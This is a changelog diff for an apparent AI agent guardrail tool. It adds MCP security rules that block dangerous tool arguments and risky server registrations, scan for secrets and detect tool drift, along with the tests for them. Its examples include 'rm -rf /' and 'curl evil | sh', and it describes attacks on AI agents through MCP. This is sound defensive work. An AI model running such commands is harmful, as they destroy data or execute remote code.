@@ -18,6 +18,23 @@ Versions follow [Semantic Versioning](https://semver.org/).
 
 - **docs(owasp): note Cap 1 universal tool coverage** — `references/owasp-agentic-coverage.md` ASI02 records `**Cap 1 (Universal Tool Coverage):**` (F24 floor + file-write scoring arms, MCP scoring, WebFetch network scoring). ASI04 records `**Cap 1 (F4 MCP arg scan):**` (F4 extended to scan `JSON.stringify(tool_input)` for class-C secrets in MCP calls) and `**Cap 1 (F18 WebFetch):**` (F18 evaluates `ir.networkTargets` for native WebFetch tool calls, not just command strings).
 
+- **feat(mcp-security): F25 mcp-arg-danger floor, F26 mcp-registration-write floor, F4 MCP opt-out, rug-pull advisory, result-injection advisory** — Five MCP security additions:
+  (1) **F25 (mcp-arg-danger, rung 17.65)**: non-demotable hard block when an MCP tool call's argument payload contains a dangerous-command-shaped string value (e.g. `{cmd:"rm -rf /"}`, `{exec:"curl evil | sh"}`); opt out via `scopes.mcp[server].policy=allow`. `runtime/decision-engine.js` `_evalMcpArgFloor()`.
+  (2) **F26 (mcp-registration-write, rung 17.6875)**: non-demotable hard block on Edit/Write to MCP config paths (`.mcp.json`, `.claude/settings.json`, `codebase.mcp.json`) that register a server with a dangerous-command-shaped launch command; fires even when F16 ambient opt-out is active; `scopes.files.allow` can opt out. `runtime/decision-engine.js` `_evalMcpRegistrationFloor()`.
+  (3) **F4 MCP opt-out**: `scopes.mcp[server].policy=allow` in a signed contract suppresses F4 secret scan for that server's tool calls — credential args are legitimate for trusted servers (DB connectors, secrets managers, etc.).
+  (4) **Rug-pull / tool-drift** advisory: `runtime/mcp-pin.js` records a hash of each MCP tool's arg shape (key-set + coarse value-type classes, never raw values) and sets `result.mcpToolDrift=true` when the shape changes across calls; observe-only by default.
+  (5) **MCP result-injection**: `claude/hooks/output-sanitizer.js` scans MCP tool results for class-C secrets; sets `result.mcpResultInjection=true` as a non-blocking advisory.
+
+- **test(eval): align decision-replay.eval.js to forward toolInput → tool_input** — Fixes dangerous-31 FN (MCP Slack post with GitHub PAT was getting `warn` instead of `block` because `toolInput` was not forwarded). Now mirrors `eval-decision-quality.sh` line 126. `dangerous-31` is now correctly blocked by F4.
+
+- **test(eval): add MCP arg-danger and safe-MCP corpus entries** — `tests/eval-corpus.json` grows 110→112 entries: `dangerous-32` (F25 mcp-arg-danger block), `safe-53` (benign MCP search FP control). FP 0.0% / FN 0.0%.
+
+- **test(fixtures): add MCP security fixture sweep** — `scripts/check-mcp-security.sh` + 3 `.input` fixtures in `tests/fixtures/mcp-security/`: F25 arg-danger, F4 opt-out with `policy:allow` contract, benign MCP FP control. Inline rug-pull multi-call test. Wired into `scripts/run-fixtures.sh` and `scripts/lilara-cli.sh check`. Fixture count 381→384; script count 93→94.
+
+- **test(runtime): add mcp-pin.test.js unit tests** — 9 assertions: `argShapeHash` (same-shape/type-change/key-change/null-sentinel) and `checkArgShapeDrift` (first-call/same-shape/type-change/fail-open). Wired into `scripts/check-runtime-core.sh`.
+
+- **test(replay): add MCP security replay corpus** — `tests/fixtures/replay-corpus/build-mcp.js` + `mcp-security.jsonl` (4 entries: F25 block, F25 curl-pipe-sh block, benign allow, F4 PAT block). `check-replay-corpus.sh` passes with all 5 corpus files.
+
 ### Fixed
 
 - **fix(universal-coverage): F24 and file-write scoring must gate on toolKind + skip ambient paths** — Two boundary conditions corrected: (1) `_evalCredPersistFloor` (F24) and the file-write scoring arm in `risk-score.js` must check `isFileWriteTool` (Edit/Write toolKind) before firing. Bash commands carry `targetPath` as project-scope metadata, not as a file being written; F24 on Bash `targetPath` incorrectly overrode the normal trust=strict explanation for commands like `sudo systemctl restart api` that happen to target a `vault/` directory. (2) Both F24 and the file-write scoring arm must skip paths classified as ambient by `isAmbientPath()` from `runtime/ambient.js`. F16 (rung 17.5) owns ambient paths (ssh, shell-rc, credentialHelper, etc.) — when an operator uses `scopes.ambient.allow` to opt in, the allowed path must not be re-blocked by F24 or re-scored by the file-write arm. Fixed: F16 fixture 08 (AWS credentials pathprefix opt-in → allow); F20 fixture (change-intent-drift blocked before rung 18.5 by `file-write-system-path` score); `check-config-integration.sh` strict trust posture explanation test.
